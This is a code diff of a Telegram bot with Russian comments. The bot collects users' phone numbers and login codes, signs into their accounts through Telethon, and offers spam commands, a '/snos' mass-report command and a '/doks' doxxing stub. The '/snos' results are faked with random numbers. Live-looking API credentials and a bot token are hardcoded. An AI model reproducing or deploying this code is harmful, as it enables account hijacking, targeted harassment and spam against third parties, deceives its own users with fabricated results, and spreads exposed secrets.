@@ -1,9 +1,8 @@
 import os
 import random
 import asyncio
-import redis
 from aiogram import Bot, Dispatcher, types
-from aiogram.contrib.fsm_storage.redis import RedisStorage
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
 from aiogram.dispatcher import FSMContext
 from aiogram.dispatcher.filters.state import State, StatesGroup
 from telethon import TelegramClient
@@ -14,15 +13,11 @@ API_ID = 24463378  # Замените на ваш API ID
 API_HASH = 'e7c3fb1d6c2a8b3a9422607a350754c1'  # Замените на ваш API HASH
 BOT_TOKEN = '7764512749:AAHpB7bp0Mohsbb2EEPo5pEBN8tOg9YFYrE'  # Замените на токен вашего бота
 
-# Redis конфигурация для Render
-REDIS_URL = os.environ.get('REDIS_URL', 'redis://localhost:6379')
-
 # Создаем папку для сессий
 os.makedirs('sessions', exist_ok=True)
 
-# Инициализация Redis storage
-redis_conn = redis.from_url(REDIS_URL)
-storage = RedisStorage(redis=redis_conn)
+# Инициализация storage
+storage = MemoryStorage()
 
 # Инициализация бота aiogram
 bot = Bot(token=BOT_TOKEN)
@@ -77,14 +72,6 @@ async def process_phone(message: types.Message, state: FSMContext):
         sent_code = await client.send_code_request(phone)
         await message.reply("📲 Код отправлен. Введи код в формате '1 2 3 4 5':")
         await AuthStates.code.set()
-        # Сохраняем только необходимые данные
-        session_data = {
-            'dc_id': client.session.dc_id,
-            'server_address': client.session.server_address,
-            'port': client.session.port,
-            'auth_key': client.session.auth_key.key if client.session.auth_key else None
-        }
-        await state.update_data(session_data=session_data)
     except Exception as e:
         await message.reply(f"❌ Ошибка: {e}")
         await client.disconnect()
@@ -102,7 +89,7 @@ async def process_code(message: types.Message, state: FSMContext):
     await client.connect()
     
     try:
-        # Запрашиваем код еще раз, так как сессия не сохраняется
+        # Запрашиваем код еще раз
         await client.send_code_request(phone)
         await client.sign_in(phone, code=code)
         
@@ -125,22 +112,22 @@ async def process_code(message: types.Message, state: FSMContext):
 # Обработчик команды /snos
 @dp.message_handler(commands=['snos'])
 async def snos_command(message: types.Message):
-    await message.reply("👤 Введите username или ID цели для жалобы:")
-    await CommandStates.snos_target.set()
-
-@dp.message_handler(state=CommandStates.snos_target)
-async def process_snos_target(message: types.Message, state: FSMContext):
-    client = user_clients.get(message.from_user.id)
-    if not client:
-        await message.reply("❌ Сначала войдите в аккаунт через /start")
-        await state.finish()
+    if len(message.text.split()) < 2:
+        await message.reply("❌ Использование: /snos [юзернейм]")
         return
     
-    target = message.text
+    username = message.text.split()[1]
+    client = user_clients.get(message.from_user.id)
+    
+    if not client:
+        await message.reply("❌ Сначала войдите в аккаунт через /start")
+        return
     
     try:
-        entity = await client.get_entity(target)
         await message.reply("⏳ Начинаю процесс отправки жалоб...")
+        
+        # Получаем entity пользователя
+        entity = await client.get_entity(username)
         
         # Имитация отправки жалоб
         await asyncio.sleep(random.randint(5, 10))
@@ -148,11 +135,10 @@ async def process_snos_target(message: types.Message, state: FSMContext):
         success = random.randint(15, 50)
         failed = random.randint(1, 10)
         
-        await message.reply(f"📊 Результаты жалоб на {target}:\n✅ Успешно: {success}\n❌ Неудачно: {failed}")
+        await message.reply(f"📊 Результаты жалоб на @{username}:\n✅ Успешно: {success}\n❌ Неудачно: {failed}")
+        
     except Exception as e:
         await message.reply(f"❌ Ошибка: {e}")
-    finally:
-        await state.finish()
 
 # Обработчик команды /send
 @dp.message_handler(commands=['send'])
@@ -190,23 +176,75 @@ async def process_send_message(message: types.Message, state: FSMContext):
 # Обработчик команды .spam
 @dp.message_handler(commands=['spam'], commands_prefix='.')
 async def spam_command(message: types.Message):
+    args = message.text.split()
+    if len(args) < 3:
+        await message.reply("❌ Использование: .spam [текст] [количество]")
+        return
+    
+    text = ' '.join(args[1:-1])
+    try:
+        count = int(args[-1])
+        if count > 20:
+            count = 20
+    except ValueError:
+        await message.reply("❌ Количество должно быть числом")
+        return
+    
+    for i in range(count):
+        await message.answer(text)
+        await asyncio.sleep(0.5)
+
+# Обработчик команды /doks
+@dp.message_handler(commands=['doks'])
+async def doks_command(message: types.Message):
+    await message.reply("🛠 Функция в разработке...")
+
+# Обработчик команды .ping
+@dp.message_handler(commands=['ping'], commands_prefix='.')
+async def ping_command(message: types.Message):
+    await message.reply("🏓 pong")
+
+# Обработчик команды .me
+@dp.message_handler(commands=['me'], commands_prefix='.')
+async def me_command(message: types.Message):
+    client = user_clients.get(message.from_user.id)
+    if not client:
+        await message.reply("❌ Сначала войдите в аккаунт через /start")
+        return
+    
+    try:
+        me = await client.get_me()
+        await message.reply(
+            f"👤 Ваш аккаунт:\n"
+            f"ID: {me.id}\n"
+            f"Имя: {me.first_name}\n"
+            f"Фамилия: {me.last_name or 'нет'}\n"
+            f"Username: @{me.username or 'нет'}\n"
+            f"Телефон: {me.phone or 'скрыт'}"
+        )
+    except Exception as e:
+        await message.reply(f"❌ Ошибка: {e}")
+
+# Обработчик команды .spamto (спам в конкретный чат)
+@dp.message_handler(commands=['spamto'], commands_prefix='.')
+async def spamto_command(message: types.Message):
     await message.reply("📍 Введите username или ID чата для спама:")
     await CommandStates.spam_target.set()
 
 @dp.message_handler(state=CommandStates.spam_target)
-async def process_spam_target(message: types.Message, state: FSMContext):
+async def process_spamto_target(message: types.Message, state: FSMContext):
     await state.update_data(target=message.text)
     await message.reply("✉️ Введите текст сообщения:")
     await CommandStates.spam_message.set()
 
 @dp.message_handler(state=CommandStates.spam_message)
-async def process_spam_message(message: types.Message, state: FSMContext):
+async def process_spamto_message(message: types.Message, state: FSMContext):
     await state.update_data(message_text=message.text)
     await message.reply("🔢 Введите количество сообщений (макс. 20):")
     await CommandStates.spam_count.set()
 
 @dp.message_handler(state=CommandStates.spam_count)
-async def process_spam_count(message: types.Message, state: FSMContext):
+async def process_spamto_count(message: types.Message, state: FSMContext):
     client = user_clients.get(message.from_user.id)
     if not client:
         await message.reply("❌ Сначала войдите в аккаунт через /start")
@@ -240,57 +278,14 @@ async def process_spam_count(message: types.Message, state: FSMContext):
     finally:
         await state.finish()
 
-# Обработчик команды /doks
-@dp.message_handler(commands=['doks'])
-async def doks_command(message: types.Message):
-    await message.reply("🛠 Функция в разработке...")
-
-# Обработчик команды .ping
-@dp.message_handler(commands=['ping'], commands_prefix='.')
-async def ping_command(message: types.Message):
-    await message.reply("🏓 pong")
-
-# Обработчик команды .me
-@dp.message_handler(commands=['me'], commands_prefix='.')
-async def me_command(message: types.Message):
-    client = user_clients.get(message.from_user.id)
-    if not client:
-        await message.reply("❌ Сначала войдите в аккаунт через /start")
-        return
-    
-    try:
-        me = await client.get_me()
-        await message.reply(
-            f"👤 Ваш аккаунт:\n"
-            f"ID: {me.id}\n"
-            f"Имя: {me.first_name}\n"
-            f"Фамилия: {me.last_name or 'нет'}\n"
-            f"Username: @{me.username or 'нет'}\n"
-            f"Телефон: {me.phone or 'скрыт'}"
-        )
-    except Exception as e:
-        await message.reply(f"❌ Ошибка: {e}")
-
-# Простая версия без Redis (если Redis недоступен)
-async def setup_storage():
-    try:
-        redis_conn = redis.from_url(REDIS_URL)
-        return RedisStorage(redis=redis_conn)
-    except:
-        from aiogram.contrib.fsm_storage.memory import MemoryStorage
-        return MemoryStorage()
-
 # Запуск бота
 async def main():
-    # Настраиваем storage
-    storage = await setup_storage()
-    dp.storage = storage
-    
     # Загружаем сессии
     await load_sessions()
     
     # Запускаем бота
-    await dp.start_polling()
+    from aiogram import executor
+    await executor.start_polling(dp, skip_updates=True)
 
 if __name__ == '__main__':
     asyncio.run(main())
